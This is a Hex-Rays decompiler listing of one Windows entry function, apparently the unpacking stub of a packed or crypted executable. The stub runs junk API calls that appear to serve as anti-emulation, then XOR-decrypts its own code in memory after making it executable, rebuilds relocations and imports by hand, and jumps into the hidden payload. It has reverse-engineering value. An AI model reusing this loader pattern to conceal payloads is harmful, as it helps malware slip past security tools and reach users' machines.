/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int@<edi>);

//-------------------------------------------------------------------------
// Data declarations

char byte_401278[] = { 'ù' }; // weak
_UNKNOWN loc_401A48; // weak
int dword_402558[170] =
{
  690738499,
  1626568609,
  -2133909656,
  1087699042,
  1092456761,
  -1357540276,
  -1646235395,
  -1902153276,
  -535757310,
  535263147,
  -944814745,
  1043658632,
  481803991,
  1766533365,
  1548758402,
  123624332,
  1970546061,
  -694627456,
  -501050231,
  1074273863,
  437409651,
  -43022871,
  -1710209583,
  -1621407131,
  2066195500,
  2053936712,
  -183925347,
  2058218265,
  1208029891,
  -83768786,
  -1312607925,
  670569396,
  583951880,
  1430672243,
  726010274,
  -582255694,
  -1713776591,
  319221600,
  1521896780,
  -2007951466,
  1213788386,
  1222154338,
  -1493983852,
  -1801881139,
  -2021099331,
  -385616068,
  288979268,
  -913683494,
  858126691,
  299479997,
  1690117483,
  1789337684,
  809729180,
  1111626426,
  -792078915,
  -464547109,
  1181030459,
  767713523,
  -897011192,
  -1575062998,
  -1491373473,
  1131191402,
  1108520496,
  -840647358,
  1134810081,
  1898523605,
  -1033833609,
  -2001598419,
  510798538,
  460480418,
  1822190247,
  313405507,
  -457358782,
  -1546395187,
  690738499,
  1626568561,
  -1308086846,
  1915406984,
  1918870046,
  -1670732005,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAllAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern BOOL (__stdcall *AddAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
char byte_404000[512] =
{
  'r',
  '\x1E',
  '¢',
  '_',
  'r',
  '\x1B',
  '§',
  'j',
  'œ',
  'l',
  'C',
  '0',
  '®',
  '\x12',
  'B',
  'B',
  '½',
  'ä',
  'Í',
  'á',
  'Ó',
  '£',
  'C',
  'Õ',
  '+',
  ')',
  'q',
  'w',
  'ó',
  '`',
  'Â',
  '-',
  '\b',
  '²',
  'ˆ',
  'Ê',
  '*',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  int v1; // esi
  int v2; // ebx
  int v3; // edx
  int v4; // edx
  unsigned int v5; // eax
  int *v6; // ecx
  char *v7; // ebp
  _WORD *v8; // edx
  unsigned int v9; // esi
  int v10; // eax
  bool v11; // zf
  char *v12; // esi
  HMODULE LibraryA; // edi
  int v14; // ebx
  char *v15; // ebx
  int v16; // eax
  FARPROC *v17; // esi
  bool j; // sf
  FARPROC ProcAddress; // eax
  DWORD flOldProtect; // [esp+10h] [ebp-Ch] BYREF
  char *i; // [esp+14h] [ebp-8h]
  HMODULE v22; // [esp+18h] [ebp-4h]

  v1 = 0;
  v2 = AddAce(0, 0, 0, 0, 0) + 37;
  if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v2 -= 34;
  CloseHandle((HANDLE)0x59);
  VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
  v4 = 9 * v3;
  v5 = 0;
  while ( 1 )
  {
    if ( v1 == v2 )
      v1 = 0;
    a1 += v4;
    byte_401278[v5++] ^= byte_404000[v1++];
    if ( v5 >= 0x1420 )
    {
      v6 = dword_402558;
      v7 = &byte_401278[-640];
      i = 0;
      while ( 1 )
      {
        v8 = v6 + 2;
        if ( (unsigned int)(v6[1] - 8) >> 1 )
        {
          v9 = (unsigned int)(v6[1] - 8) >> 1;
          do
          {
            if ( (*v8 & 0xF000) == 12288 )
              *(_DWORD *)&v7[*v6 + (*v8 & 0xFFF)] += &byte_401278[-268436096];
            ++v8;
            --v9;
          }
          while ( v9 );
        }
        v10 = v6[1];
        v6 = (int *)((char *)v6 + v10);
        i += v10;
        if ( (unsigned int)i >= 0xE4 )
        {
          v11 = *(_DWORD *)&byte_401278[2796] == 0;
          v12 = &byte_401278[2780];
          for ( i = &byte_401278[2780]; !v11; i = v12 )
          {
            LibraryA = LoadLibraryA(&v7[*((_DWORD *)v12 + 3)]);
            v22 = LibraryA;
            if ( LibraryA )
            {
              v14 = *(_DWORD *)v12;
              if ( !*(_DWORD *)v12 )
                v14 = *((_DWORD *)v12 + 4);
              v15 = &v7[v14];
              v16 = *(_DWORD *)v15;
              v17 = (FARPROC *)&v7[*((_DWORD *)v12 + 4)];
              for ( j = *(int *)v15 < 0; *(_DWORD *)v15; j = *(int *)v15 < 0 )
              {
                if ( j )
                {
                  ProcAddress = GetProcAddress(LibraryA, (LPCSTR)*(unsigned __int16 *)v15);
                  LibraryA = v22;
                }
                else
                {
                  ProcAddress = GetProcAddress(LibraryA, &v7[v16 + 2]);
                }
                v15 += 4;
                *v17 = ProcAddress;
                v16 = *(_DWORD *)v15;
                ++v17;
              }
              v12 = i;
            }
            v12 += 20;
            v11 = *((_DWORD *)v12 + 4) == 0;
          }
          ((void (__thiscall *)(int *))loc_401A48)(v6);
          ExitProcess(0);
        }
      }
    }
  }
}
// 401049: variable 'v3' is possibly undefined
// 40116C: variable 'v6' is possibly undefined
// 402558: using guessed type int dword_402558[170];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
